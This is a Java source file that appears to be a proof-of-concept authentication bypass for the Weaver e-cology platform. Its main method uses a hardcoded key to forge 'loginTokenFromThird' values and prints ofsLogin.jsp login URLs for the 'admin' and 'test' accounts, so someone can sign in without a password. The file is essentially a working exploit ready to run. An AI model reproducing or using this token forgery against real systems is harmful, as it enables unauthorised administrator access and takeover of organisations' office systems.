import java.io.InputStream;
import java.io.OutputStream;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class AESCoder {
    public static byte[] initSecretKey(String code) {
        KeyGenerator kg = null;

        try {
            kg = KeyGenerator.getInstance("AES");
            SecureRandom secureRandom = SecureRandom.getInstance("SHA1PRNG");
            secureRandom.setSeed(code.getBytes());
            kg.init(128, secureRandom);
        } catch (NoSuchAlgorithmException var3) {
            var3.printStackTrace();
            return new byte[0];
        }

        SecretKey secretKey = kg.generateKey();
        return secretKey.getEncoded();
    }

    public static String encrypt(String sSrc, String sKey) throws Exception {
        if (sKey == null) {
            sKey = "WEAVERECOLOGYSECURITY3.0VERSION201607150857";
        }

        byte[] raw = initSecretKey(sKey);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(sSrc.getBytes());
        return byte2hex(encrypted).toLowerCase();
    }

    public static byte[] hex2byte(String strhex) {
        if (strhex == null) {
            return null;
        } else {
            int l = strhex.length();
            if (l % 2 == 1) {
                return null;
            } else {
                byte[] b = new byte[l / 2];

                for(int i = 0; i != l / 2; ++i) {
                    b[i] = (byte)Integer.parseInt(strhex.substring(i * 2, i * 2 + 2), 16);
                }

                return b;
            }
        }
    }

    public static String byte2hex(byte[] b) {
        String hs = "";
        String stmp = "";

        for(int n = 0; n < b.length; ++n) {
            stmp = Integer.toHexString(b[n] & 255);
            if (stmp.length() == 1) {
                hs = hs + "0" + stmp;
            } else {
                hs = hs + stmp;
            }
        }

        return hs.toUpperCase();
    }

    public static void main(String[] args) throws Exception {
        String[] arr = {"admin", "test"};

        for(String receiver : arr ){
            String loginTokenFromThird = encrypt(receiver + "1", "1u6skkR"); // 生成loginTokenFromThird
            String path = String.format("\'%s\': /mobile/plugin/1/ofsLogin.jsp?syscode=%s&timestamp=%s&gopage=/wui/index.html&receiver=%s&loginTokenFromThird=%s", receiver, "1", "1", receiver, loginTokenFromThird);
            System.out.println(path);
        }
    }
}
